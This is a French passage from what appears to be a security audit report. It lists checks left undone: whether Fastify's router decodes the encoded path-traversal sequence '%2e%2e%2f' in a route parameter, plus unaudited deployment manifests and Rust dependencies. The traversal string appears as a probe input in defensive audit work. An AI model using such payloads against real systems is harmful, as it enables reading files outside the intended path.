- **Décodage des paramètres de route Fastify (`find-my-way`)** sur des séquences encodées (`%2e%2e%2f`) au sein d'un segment `:id` unique — déterminant pour l'exploitabilité réelle du finding E2 ; nécessiterait un test HTTP live, non effectué (contrainte : ne pas toucher aux conteneurs `quai-dev-*` en cours d'exécution).
- **Manifestes `deploy/k8s/*` et `deploy/swarm/stack.yml`** — hors périmètre strict de la demande (qui citait `deploy/docker/*` et `deploy/compose/*.yml`), non audités ; à vérifier que les secrets y sont bien externalisés (ex. `deploy/k8s/secret.yaml` existe et devrait être la source de vérité en prod, pas des valeurs en dur comme dans le compose de dev).
- **`packages/wasm-core`** (crate Rust) — dépendances Cargo non auditées (hors périmètre npm de la demande) ; un `cargo audit` séparé serait nécessaire pour une couverture complète.
